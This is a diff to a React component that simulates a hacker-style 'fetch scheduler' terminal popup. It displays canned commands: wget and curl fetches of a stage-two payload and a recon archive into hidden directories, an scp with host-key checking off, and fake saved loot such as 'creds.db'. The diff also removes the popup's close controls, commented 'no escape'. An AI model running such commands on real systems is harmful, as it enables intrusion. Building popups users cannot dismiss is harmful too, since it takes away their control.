@@ -306,7 +306,7 @@ export default function PopupTerminal({ onClose, rhost = "target", lhost = "oper
 
 /* ── Download Scheduler Popup ─────────────────────────────────── */
 
-const DOWNLOAD_COMMANDS = [
+const FETCH_COMMANDS = [
   "wget -qO /tmp/.cache https://{rhost}:8443/payload/stage2.bin",
   "curl -sSfL https://cdn.ops.internal/modules/recon.tar.gz | tar xz -C /opt/.modules/",
   "scp -o StrictHostKeyChecking=no root@{rhost}:/var/spool/tasks/heartbeat.sh /tmp/",
@@ -317,67 +317,140 @@ const DOWNLOAD_COMMANDS = [
   "curl -H 'X-Auth: spm-token' https://{rhost}:8443/api/tasks -o /var/spool/tasks.json",
 ];
 
-function DownloadScheduler({ rhost, onClose }: { rhost: string; onClose: () => void }) {
-  const [dlLines, setDlLines] = useState<string[]>([]);
-  const [countdown, setCountdown] = useState(3600);
-  const [cycle, setCycle] = useState(1);
+type DlPhase = "idle" | "set-interval" | "fetching" | "ask-folder" | "saving";
+
+function DownloadScheduler({ rhost }: { rhost: string }) {
+  const [lines, setLines] = useState<string[]>([]);
+  const [input, setInput] = useState("");
+  const [phase, setPhase] = useState<DlPhase>("idle");
+  const [countdown, setCountdown] = useState(0);
+  const [totalSeconds, setTotalSeconds] = useState(0);
+  const [cycle, setCycle] = useState(0);
+  const inputRef = useRef<HTMLInputElement>(null);
   const bottomRef = useRef<HTMLDivElement>(null);
 
-  const generateBatch = useCallback((cycleNum: number) => {
-    const ts = new Date().toISOString();
-    const header = `\n── CYCLE ${cycleNum} | ${ts} ──`;
-    const count = 2 + Math.floor(Math.random() * 3);
-    const shuffled = [...DOWNLOAD_COMMANDS].sort(() => Math.random() - 0.5).slice(0, count);
-    const cmds = shuffled.map((c) => c.replace(/\{rhost\}/g, rhost));
-    const batch = [
-      header,
-      `[*] scheduled download batch #${cycleNum} — ${count} tasks`,
-      ...cmds.map((c) => `$ ${c}`),
-      ...cmds.map((_, i) => `[+] task ${i + 1}/${count} complete — ${(Math.random() * 4 + 0.5).toFixed(1)}s`),
-      `[+] batch #${cycleNum} finished — next in 3600s`,
-    ];
-    return batch;
-  }, [rhost]);
-
-  // Initial batch on mount
-  useEffect(() => {
-    const boot = [
-      "[*] spm download scheduler v1.2.0",
-      "[*] interval: 3600s (1h)",
-      `[*] target: ${rhost}`,
-      "[+] scheduler armed — executing first batch now...",
-    ];
-    const initial = generateBatch(1);
-    setDlLines([...boot, ...initial]);
-  }, [rhost, generateBatch]);
+  useEffect(() => { bottomRef.current?.scrollIntoView({ block: "end" }); }, [lines]);
+  useEffect(() => { inputRef.current?.focus(); }, [phase]);
 
   // Countdown timer
   useEffect(() => {
+    if (phase !== "fetching" || countdown <= 0) return;
     const id = setInterval(() => {
       setCountdown((c) => {
-        if (c <= 1) {
-          setCycle((prev) => {
-            const next = prev + 1;
-            const batch = generateBatch(next);
-            setDlLines((p) => [...p, ...batch]);
-            return next;
-          });
-          return 3600;
+        const next = c - 1;
+        if (next <= 0) {
+          // Fetching complete — ask for folder
+          setPhase("ask-folder");
+          setLines((p) => [
+            ...p,
+            "",
+            "[+] fetch cycle complete — all tasks finished.",
+            "[*] specify destination folder for downloaded files:",
+          ]);
+          return 0;
         }
-        return c - 1;
+        // When 10% time remains, show progress messages
+        if (next === Math.floor(totalSeconds * 0.1)) {
+          const count = 2 + Math.floor(Math.random() * 3);
+          const shuffled = [...FETCH_COMMANDS].sort(() => Math.random() - 0.5).slice(0, count);
+          const cmds = shuffled.map((cmd) => cmd.replace(/\{rhost\}/g, rhost));
+          setLines((p) => [
+            ...p,
+            `[*] finalizing fetch batch — ${count} remaining transfers ...`,
+            ...cmds.map((c) => `$ ${c}`),
+          ]);
+        }
+        return next;
       });
     }, 1000);
     return () => clearInterval(id);
-  }, [generateBatch]);
+  }, [phase, countdown, totalSeconds, rhost]);
 
-  useEffect(() => { bottomRef.current?.scrollIntoView({ block: "end" }); }, [dlLines]);
+  const handleSubmit = (raw: string) => {
+    const val = raw.trim();
 
-  const mins = Math.floor(countdown / 60);
+    if (phase === "idle") {
+      setLines((p) => [...p, `spm-fetch > ${raw}`]);
+      if (val.toLowerCase() === "start fetch") {
+        setLines((p) => [
+          ...p,
+          "[*] initializing fetch module ...",
+          "[+] fetch module ready.",
+          "",
+          "[?] set fetch interval in hours (e.g. 1, 2, 4):",
+        ]);
+        setPhase("set-interval");
+      } else if (val) {
+        setLines((p) => [...p, `[!] unknown command. type 'start fetch' to begin.`]);
+      }
+      return;
+    }
+
+    if (phase === "set-interval") {
+      setLines((p) => [...p, `spm-fetch > ${raw}`]);
+      const hours = parseFloat(val);
+      if (!val || isNaN(hours) || hours <= 0 || hours > 24) {
+        setLines((p) => [...p, "[!] invalid interval. enter a number between 1 and 24."]);
+        return;
+      }
+      const secs = Math.round(hours * 3600);
+      setTotalSeconds(secs);
+      setCountdown(secs);
+      setCycle((c) => c + 1);
+
+      const count = 2 + Math.floor(Math.random() * 3);
+      const shuffled = [...FETCH_COMMANDS].sort(() => Math.random() - 0.5).slice(0, count);
+      const cmds = shuffled.map((c) => c.replace(/\{rhost\}/g, rhost));
+
+      setLines((p) => [
+        ...p,
+        "",
+        `[+] fetch interval set to ${hours}h (${secs}s)`,
+        `[*] starting fetch cycle #${cycle + 1} ...`,
+        `[*] queued ${count} download tasks`,
+        ...cmds.map((c) => `$ ${c}`),
+        "",
+        "[*] fetching in progress — please wait ...",
+      ]);
+      setPhase("fetching");
+      return;
+    }
+
+    if (phase === "ask-folder") {
+      setLines((p) => [...p, `spm-fetch > ${raw}`]);
+      const folder = val || "/root/loot";
+      setPhase("saving");
+      setLines((p) => [
+        ...p,
+        `[*] saving fetched data to ${folder}/ ...`,
+        `[*] creating directory structure ...`,
+        `[+] ${folder}/stage2.bin — 4.2 MB`,
+        `[+] ${folder}/recon.tar.gz — 12.7 MB`,
+        `[+] ${folder}/creds.db — 892 KB`,
+        `[+] ${folder}/beacon.json — 3.1 KB`,
+        "",
+        `[+] all files saved to ${folder}/`,
+        `[+] total: 17.8 MB across 4 files`,
+        "",
+        "[*] fetch cycle complete. scheduler idle.",
+        "[*] type 'start fetch' to begin a new cycle.",
+      ]);
+      setTimeout(() => setPhase("idle"), 100);
+      return;
+    }
+  };
+
+  const hrs = Math.floor(countdown / 3600);
+  const mins = Math.floor((countdown % 3600) / 60);
   const secs = countdown % 60;
+  const pct = totalSeconds > 0 ? Math.round(((totalSeconds - countdown) / totalSeconds) * 100) : 0;
+
+  const inputDisabled = phase === "fetching" || phase === "saving";
 
   return (
     <div className="fixed inset-0 z-[60] flex items-center justify-center p-4">
-      <div className="pointer-events-auto absolute inset-0 bg-background/50" onClick={onClose} />
+      {/* No backdrop click — no escape */}
+      <div className="pointer-events-none absolute inset-0 bg-background/80" />
       <div
         className="relative z-10 flex w-full max-w-lg flex-col overflow-hidden rounded-lg border border-terminal-green/60 font-mono shadow-[0_0_60px_oklch(0.55_0.18_145_/_0.4)]"
         style={{
@@ -385,47 +458,87 @@ function DownloadScheduler({ rhost, onClose }: { rhost: string; onClose: () => v
         }}
         onClick={(e) => e.stopPropagation()}
       >
-        {/* Title bar */}
+        {/* Title bar — no close button */}
         <div className="flex items-center justify-between border-b border-terminal-green/40 bg-terminal-green/[0.06] px-3 py-2">
           <div className="flex items-center gap-2">
             <div className="flex gap-1.5">
-              <button onClick={onClose} className="h-2.5 w-2.5 rounded-full bg-terminal-red hover:opacity-80" aria-label="Close" />
+              <span className="h-2.5 w-2.5 rounded-full bg-terminal-red/40" />
               <span className="h-2.5 w-2.5 rounded-full bg-terminal-yellow" />
               <span className="h-2.5 w-2.5 rounded-full bg-terminal-green" />
             </div>
             <span className="ml-2 text-[10px] font-bold uppercase tracking-[0.3em] text-terminal-green">
-              spm // download scheduler
+              spm // fetch scheduler
             </span>
           </div>
           <span className="flex items-center gap-2">
-            <span className="rounded-sm border border-terminal-yellow/50 px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-widest text-terminal-yellow">
-              next: {String(mins).padStart(2, "0")}:{String(secs).padStart(2, "0")}
-            </span>
-            <span className="rounded-sm border border-terminal-green/50 px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-widest text-terminal-green">
-              ACTIVE
+            {phase === "fetching" && (
+              <span className="rounded-sm border border-terminal-yellow/50 px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-widest text-terminal-yellow">
+                {String(hrs).padStart(2, "0")}:{String(mins).padStart(2, "0")}:{String(secs).padStart(2, "0")} — {pct}%
+              </span>
+            )}
+            <span className={`rounded-sm border px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-widest ${
+              phase === "fetching" ? "border-terminal-yellow/50 text-terminal-yellow" :
+              phase === "idle" ? "border-terminal-green/50 text-terminal-green" :
+              "border-terminal-cyan/50 text-terminal-cyan"
+            }`}>
+              {phase === "fetching" ? "FETCHING" : phase === "ask-folder" ? "AWAITING INPUT" : phase === "saving" ? "SAVING" : "READY"}
             </span>
           </span>
         </div>
 
         {/* Log body */}
-        <div className="h-[320px] overflow-y-auto px-3 py-2 text-[11px] leading-relaxed">
-          <div className="text-terminal-green">░ D O W N L O A D   S C H E D U L E R ░</div>
-          <div className="mb-2 text-muted-foreground">Automated fetch cycle — interval 1h · close to dismiss</div>
-          {dlLines.filter((l): l is string => typeof l === "string").map((l, i) => {
-            const color = l.startsWith("──") ? "text-terminal-cyan"
-              : l.startsWith("[+]") ? "text-terminal-green"
+        <div
+          className="h-[320px] overflow-y-auto px-3 py-2 text-[11px] leading-relaxed"
+          onClick={() => inputRef.current?.focus()}
+        >
+          <div className="text-terminal-green">░ F E T C H   S C H E D U L E R ░</div>
+          <div className="mb-2 text-muted-foreground">type 'start fetch' to begin</div>
+          {lines.filter((l): l is string => typeof l === "string").map((l, i) => {
+            const color = l.startsWith("[+]") ? "text-terminal-green"
               : l.startsWith("[*]") ? "text-terminal-yellow"
+              : l.startsWith("[!]") ? "text-terminal-red"
+              : l.startsWith("[?]") ? "text-terminal-cyan"
               : l.startsWith("$") ? "text-foreground/90"
+              : l.startsWith("spm-fetch") ? "text-foreground/80"
               : "text-muted-foreground";
             return <div key={i} className={`whitespace-pre-wrap break-all ${color}`}>{l}</div>;
           })}
+          {phase === "fetching" && (
+            <div className="mt-2 text-terminal-yellow animate-pulse">
+              [*] fetching ... {pct}% — {String(hrs).padStart(2, "0")}:{String(mins).padStart(2, "0")}:{String(secs).padStart(2, "0")} remaining
+            </div>
+          )}
+          {/* Input line — hidden when fetching */}
+          {!inputDisabled && (
+            <div className="mt-1 flex items-center gap-1.5">
+              <span className="text-terminal-green">spm-fetch</span>
+              <span className="text-muted-foreground"> &gt;</span>
+              <input
+                ref={inputRef}
+                value={input}
+                onChange={(e) => setInput(e.target.value)}
+                onKeyDown={(e) => {
+                  if (e.key === "Enter") {
+                    e.preventDefault();
+                    handleSubmit(input);
+                    setInput("");
+                  }
+                }}
+                autoFocus
+                spellCheck={false}
+                autoComplete="off"
+                className="flex-1 bg-transparent text-foreground caret-terminal-green outline-none"
+              />
+              <span className="h-3 w-2 animate-pulse bg-terminal-green" />
+            </div>
+          )}
           <div ref={bottomRef} />
         </div>
 
         {/* Status bar */}
         <div className="flex items-center justify-between border-t border-terminal-green/40 bg-terminal-green/[0.06] px-3 py-1 text-[9px] uppercase tracking-wider text-muted-foreground">
           <span>CYCLE: <span className="text-terminal-green">{cycle}</span></span>
-          <span>INTERVAL: <span className="text-terminal-yellow">3600s</span></span>
+          <span>STATUS: <span className={phase === "fetching" ? "text-terminal-yellow" : "text-terminal-green"}>{phase.toUpperCase()}</span></span>
           <span>HOST: <span className="text-terminal-green">{rhost}</span></span>
         </div>
       </div>
